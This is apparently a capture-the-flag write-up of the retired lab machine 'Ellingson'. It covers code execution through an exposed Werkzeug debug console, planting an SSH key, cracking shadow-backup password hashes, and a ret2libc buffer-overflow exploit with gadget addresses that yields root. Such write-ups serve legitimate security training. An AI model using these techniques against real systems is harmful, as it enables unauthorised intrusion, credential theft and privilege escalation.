# Ellingson

This is the write-up for the box Ellingson that got retired at the 19th October 2019.
My IP address was 10.10.14.19 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.139    ellingson.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/ellingson.nmap 10.10.10.139
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web page is a custom built company website for **Ellingson Mineral Corp** from the movie **Hackers from 1995** with some articles about a security breach:

![Ellingson Mineral Corp homepage](ellingson_web-1.png)

- Suspicious Network Activity
```markdown
We have recently detected suspicious activity on the network. Please make sure you change your password regularly and read my carefully prepared memo on the most commonly used passwords. Now as I so meticulously pointed out the most common passwords are. Love, Secret, Sex and God -The Plague
```

- Q3 Corporate Financial results / Additional Protections Added
```markdown
Due to the recent security issues we have implemented protections to block brute-force attacks against network services. As a result if you attempt to log into a service more then 5 times in 1 minute you will have your access blocked for 5 minutes. Additional malicious activity may also result in your connection being blocked, please keep this in mind and do not request resets if you lock yourself out ... take the 5 minutes and ponder where you went wrong :)
```

- Virus Planted in Ellingson Mainframe
```markdown
A recent unknown intruder penetrated using a super user account giving him access to our entire system. Yesterday the ballest program for a supertanker training model mistakenly thought the vessel was empty and flooded it's tanks. This caused the vessel to capsize, a virus planted within the Ellingson system claimed responsibility and threatened to capsize more vessels unless five million dollars are transfered to their accounts.
```

There are some potential usernames that are also from the movie **Hackers**:
- Margo Wallace
- Eugene Belford
- Duke Ellingson

The articles forward to _/articles/1_, _/articles/2_ and _/articles/3_ and when going to _/articles/4_, the web service shows an error:
```markdown
builtins.IndexError

IndexError: list index out of range
Traceback (most recent call last)

    File "/usr/lib/python3/dist-packages/flask/app.py", line 1997, in __call__

    return self.wsgi_app(environ, start_response)
(...)
The debugger caught an exception in your WSGI application. You can now look at the traceback which led to the error.
(...)
```

### Getting a Reverse Shell

The service in the background is a **Python Flask** application and its running in _debug mode_.
That means that the debugger **Werkzeug** can be used from this web page and Python code runs successfully:

![Python Werkzeug debugger](ellingson_web-2.png)

Running `whoami`:
```python
from subprocess import getoutput
getoutput("whoami")

# Output: 'hal'
```

Trying to connect to my own client:
```python
getoutput("curl 10.10.14.19")
```

Unfortunately it does not get back to us, which means there is a firewall in between and thus a reverse shell connection is not possible.
Going through the file system is hard to read but by using the following function, it is slightly cleaner:
```python
def run(cmd): from subprocess import getoutput;x=getoutput(cmd);print(x)
```
```python
run("ls -la ~")

run("ls -la ~/.ssh")

run("cat ~/.ssh/id_rsa")
```

The private SSH key of _hal_ is readable, but it is encrypted:
```markdown
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC
(...)
```

> NOTE: The password for this key is not crackable with normal resources and therefore I will not try.

As _hal_ has write permissions to the SSH folder, we are able to create our own SSH key and place it there. Creating SSH key for _hal_ on own client:
```markdown
ssh-keygen -f hal

chmod 600 hal
```

Pasting the public key _(hal.pub)_ into _authorized_keys_ on the box:
```python
run("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf7rWlfM/LFm/1/S6w91ohmyK1M5RKS7evo+6+YdzntgtwX8VBA1GxDHL+sn7sSStmj3xNPokftjg289Vwm/7QD8Njc3CR8AuHtWQd7scOZa+N3sp+Lh5ayVfmV2GglqyzbuRNvcaN4/KnTKZ2hrbnEWsQ0m0ZVMWjApXs/mYtnAxeOL8ISdmKS+Q0mxg3UdkzS9n0kRrAdokdUZKU1l+J2595SkDNazXax0gF014ndlXquw69TG6grb6hDlrzFyKK5JKtfXGcRTduUvwqCn6dnDrhPp7FB+PixXuPcxFk2FBaf4FasEiEwbL5gDilzFN1T+asw3YDqhzkcgZ287CXb2C0EJe4QbgNjWu/4dPGYHd7bKotWB+ksD7D/Pn87oGxxpBqLH/8PIptzLM0sOsWb5DE+TUEMBvI4bHw0OLBTomvcoPKAKcPe78STMINHPO9sEshrCFZbZdpRjzixpL/eu1PWOFMkgUiHRcpkapUg2tQCPjMzlTz6R1XCJ1bG6U=' >> ~/.ssh/authorized_keys")
```

The command has to run twice, because of formatting errors and then login into the box via SSH as _hal_ works:
```markdown
ssh -i hal hal@10.10.10.139
```

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Linux Enumeration Script**.
As there is a firewall, we can't download something directly to the box, but can copy it manually:
```markdown
cat LinEnum.sh | base64 -w 0 | xclip -selection primary
```

Pasting into a file on the box and decoding it:
```markdown
base64 -d LinEnum.sh > LinEnum.sh

chmod +x LinEnum.sh

./LinEnum.sh
```

Observations:
- User _hal_ is a member of _adm_ group
- Additional users: _duke_, _margo_, _theplague_
- Binary with **SetUID bit** set: _/usr/bin/garbage_

### Analyzing the Binary

When running _garbage_ it displays that the user is not authorized to access this application and that the attempt will be logged.
The string trace shows, that it is looking for user `id` _1001_ which is the ID of _hal_:
```markdown
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
```
```markdown
strace /usr/bin/garbage
```
```markdown
(...)
munmap(0x7f7cdf842000, 28974)     = 0
getuid()                          = 1001
brk(NULL)                         = 0x4a7000
(...)
```

Copying it to our local client for further analysis:
```markdown
scp -i hal hal@10.10.10.139:/usr/bin/garbage .
```

After analyzing it in a debugger, it shows that the program only grants access to users with the ID _0 (root)_, _1000 (theplague)_ and _1002 (margo)_.
The `strings` show a clear-text password:
```markdown
strings /usr/bin/garbage
```
```markdown
Enter access password:
N3veRF3@r1iSh3r3!
(...)
```

As the user checks can't be bypassed, this binary has no attack surface until escalating to another user.

### Checking Permissions of ADM Group

Lets see which files the group _adm_ has access to:
```markdown
find / -group adm -ls 2>/dev/null
```

There are some log files and most unique is the file _/var/backups/shadow.bak_, which is a backup of the **Shadow file** with password hashes:
```markdown
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/
```

Looking at the time stamps of the original Shadow file and the backup:
```markdown
ls -la --time-style=full-iso /etc/shadow /var/backups/shadow.bak

-rw-r----- 1 root shadow 1330 2019-03-09 22:21:10.157756098 +0000 /etc/shadow
-rw-r----- 1 root adm    1309 2019-03-09 20:42:17.541641525 +0000 /var/backups/shadow.bak
```

As the original Shadow file was modified after the creation of the backup, not every hash in the backup will be valid.

The log file _auth.log_ logs password changes:
```markdown
grep passwd /var/log/auth.log

Mar  9 19:20:27 ellingson passwd[8997]: pam_unix(passwd:chauthtok): password changed for hal
Mar  9 19:20:48 ellingson passwd[9015]: pam_unix(passwd:chauthtok): password changed for margo
Mar  9 19:21:08 ellingson passwd[9033]: pam_unix(passwd:chauthtok): password changed for duke
Mar  9 22:06:27 ellingson passwd[11992]: pam_unix(passwd:chauthtok): password changed for theplague
Mar  9 22:06:53 ellingson passwd[11994]: pam_unix(passwd:chauthtok): password changed for hal
Mar  9 22:07:12 ellingson passwd[11998]: pam_unix(passwd:chauthtok): password changed for duke
```

In here it says, that the passwords of all users were changed at the given time except for _margo_.
All user hashes can be put in a file to attempt to get cracked with **Hashcat**:
```markdown
hashcat -m 1800 --username ellingson_users.hash /usr/share/wordlists/rockyou.txt
```

After a while the password of _theplague_ gets cracked:
> password123

But as this user changed the password after the backup, the password does not work.

After a while the password of _margo_ gets cracked:
> iamgod$08

```markdown
ssh margo@10.10.10.139
```

This password works on SSH and privileges got escalated to _margo_.

### Privilege Escalation 2

With the user _margo_ the binary _garbage_ can be run and it asks for a password, which was found in the `strings`:
```markdown
margo@ellingson:~$ garbage
Enter access password: N3veRF3@r1iSh3r3!

access granted.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit
```

Output of all the options:
```markdown
\> 1
Balance is $1337
\> 2
Row Row Row Your Boat...
\> 3
The tankers have stopped capsizing
\> 4
_Option 4 exits the program_
```

There are two parts where user input is allowed, one on the password input and then in the program to choose an option.
Lets try to input a long string there to see, how the program behaves:
```markdown
Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

access denied.
Segmentation fault (core dumped)
```

It crashes with a **Segmentation Fault**.

#### Exploiting the Buffer Overflow

Starting the binary with `gdb`:
```markdown
gdb ./garbage
```

Creating an unique pattern with 300 characters:
```markdown
pattern create 300

[+] Generating a pattern of 300 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
```

After running the program with this pattern as the password, it shows that the register _RSP_ crashed at this point:
```markdown
$rsp   : 0x00007ffc8c95df88  →  "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
```

Searching for the offset in the pattern:
```markdown
pattern offset raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa

[+] Searching 'raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa'
[+] Found at offset 136 (big-endian search)
```

Some different addresses are needed to create exploit code.

Searching for gadgets with the **GDB-gef ropper** module:
```markdown
ropper --search "pop r?i"

[INFO] Load gadgets for section: LOAD
[INFO] Searching for gadgets: pop r?i

0x000000000040179b: pop rdi; ret;
```

Searching for **Procedural Link Table (PLT)** and **Global Offset Address** of `puts`:
```markdown
objdump -D garbage | grep puts

0000000000401050 <puts@plt>:
404028 <puts@GLIBC_2.2.5>
(...)
```

Searching for **Procedural Link Table (PLT)** of `main`:
```markdown
objdump -D garbage | grep main

0000000000401619 <main>:
```

Location of **libc**:
```markdown
ldd garbage

libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f74dd079000)
```

Getting the address of **libc puts**:
```markdown
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts

# Ellingson
00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
```

Getting the address of **libc system**:
```markdown
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

# Ellingson
000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

Getting the address of **libc setuid**:
```markdown
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep setuid

# Ellingson
00000000000e5970   144 FUNC    WEAK   DEFAULT   13 setuid@@GLIBC_2.2.5
```

Getting address of _/bin/sh_ in **libc**:
```markdown
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh

# Ellingson
1b3e9a /bin/sh
```

After getting all of those addresses, exploit code can be created. In the code the variables for the gathered addresses look like this:
```python
# Gets to RSP Overwrite found via pattern offset
junk = ("A" * 136).encode()

# RDI address found via 'ropper --search "pop r?i"'
pop_rdi = p64(0x040179b)

# Global offset pointer to libc (puts location) found via 'objdump -D garbage | grep puts'
got_puts = p64(0x404028)
# Location of callc in PLT found via 'objdump -D garbage | grep puts'
plt_puts = p64(0x401050)
# PLT of main found via 'objdump -D garbage | grep main'
plt_main = p64(0x401619)

# Libc puts found via 'readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts'
libc_puts = p64(0x809c0)
# Libc system found via 'readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system'
libc_system = p64(0x4f440)
# Libc setuid found via 'readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep setuid'
libc_setuid = p64(0xe5970)
# Libc sh found via 'strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh'
libc_sh = p64(0x1b3e9a)
```

The complete Python script _ellingson_bof.py_ can be found in this repository.
When running the script on my local box, it exploits the Buffer Overflow and starts _/bin/sh_, so now running this through SSH and exploit it on the box:
```markdown
python3 ellingson_bof.py
```

After running it a few times until it hits a good leaked address, the script starts a shell connection as root!
